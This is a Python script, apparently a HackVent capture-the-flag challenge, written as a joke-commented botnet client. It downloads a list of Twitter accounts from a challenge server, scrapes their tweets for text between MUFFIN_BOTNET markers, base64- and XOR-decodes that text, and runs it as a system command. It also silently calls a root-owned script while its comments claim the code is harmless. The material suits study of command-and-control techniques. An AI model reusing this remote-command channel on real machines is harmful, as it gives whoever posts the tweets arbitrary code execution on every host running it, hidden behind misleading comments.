# as stupid as this is, it definetly can't be something dangerous! :)

import base64, os, re, urllib2
from easyprocess import EasyProcess

os.system('/root/checker.py') # this does nothing

# gosh im stupid
# (╯°□°）╯︵ ┻━┻
yolo, gimme_muffin, party_hard, ten_inches, omg_wat = base64.b64decode, urllib2.urlopen, re.findall, len, range

def x(t): return ''.join([chr(ord(t[i])^[0x66, 0x66, 0x66, 0x13, 0x37, 0x42, 0x69, 0x33, 0x01, 0x13][i%10]) for i in omg_wat(ten_inches(t))])

# yeah stop to reverse 1337 hax0r i got dem skillz pew pew pew

def ok_cool(c):
    # dont reverse this i am a big guy
    # dolan
    try: c = x(yolo(c)); EasyProcess(c).call(timeout=2)
    except: pass

def wtf(n):
    # wat r u doin
    t = "https://twitter.com" + n; cs = [] #yolo('aHR0cHM6Ly90d2l0dGVyLmNvbS8=') + n; cs = []
    # pls leak this as an nsa sample

    # TweetTextSize(.*)</p
    try: c_txt = urllib2.urlopen(t).read(); cs = re.findall("TweetTextSize(.*)</p", c_txt) #cs = party_hard(yolo('VHdlZXRUZXh0U2l6ZSguKik8L3A='), c_txt)
    # *placing advertisements* https://twitter.com/muffiniks
    except: pass
    # dolan
    for c in cs:
        try:
            c = c[c.index('>')+1:]
            # y i could use regex lil
            if '<a href="/muffiniks" class="twitter-atreply pretty-link js-nav" dir="ltr" data-mentioned-user-id="764117042274373632" ><s>@</s><b>muffiniks</b></a> <a href="/hashtag/hackvent?src=hash" data-query-source="hashtag_click" class="twitter-hashtag pretty-link js-nav" dir="ltr" ><s>#</s><b>hackvent</b></a> <a href="https://t.co/MtJMTespOL" rel="nofollow noopener" dir="ltr" data-expanded-url="http://hackvent.hacking-lab.com" class="twitter-timeline-link" target="_blank" title="http://hackvent.hacking-lab.com" ><span class="tco-ellipsis"></span><span class="invisible">http://</span><span class="js-display-url">hackvent.hacking-lab.com</span><span class="invisible"></span><span class="tco-ellipsis"><span class="invisible">&nbsp;</span></span></a> ' in c:
                c = c[c.index("MUFFIN_BOTNET:")+len("MUFFIN_BOTNET:"):]
                c = c[:c.index(":MUFFIN_BOTNET")]
                ok_cool(c)
                #c = c[c.index(yolo('TVVGRklOX0JPVE5FVDo='))+ten_inches(yolo('TVVGRklOX0JPVE5FVDo=')):]; c = c[:c.index(yolo('Ok1VRkZJTl9CT1RORVQ='))]; ok_cool(c)
        except: pass

def ohai():
    # PLS STAHP
    ns = []
    # yes I work for the cia
    try: n_txt = urllib2.urlopen("http://challenges.hackvent.hacking-lab.com:8081/?twitter").read()
    ns = list(set([n for n in n_txt.split('|') if len(n) > 1]))
    #gimme_muffin(yolo('aHR0cDovL2NoYWxsZW5nZXMuaGFja3ZlbnQuaGFja2luZy1sYWIuY29tOjgwODEvP3R3aXR0ZXI=')).read(); ns = list(set([n for n in n_txt.split('|') if ten_inches(n) > 1]))
    # rnd comments ftw
    except: pass
    # TODO: add launch code
    for n in ns: wtf(n)

# next year I will be less nice >:D
# ( ˘ ³˘)♥
ohai()

# if you reached this point and you didn't cringed once call 9-1-1
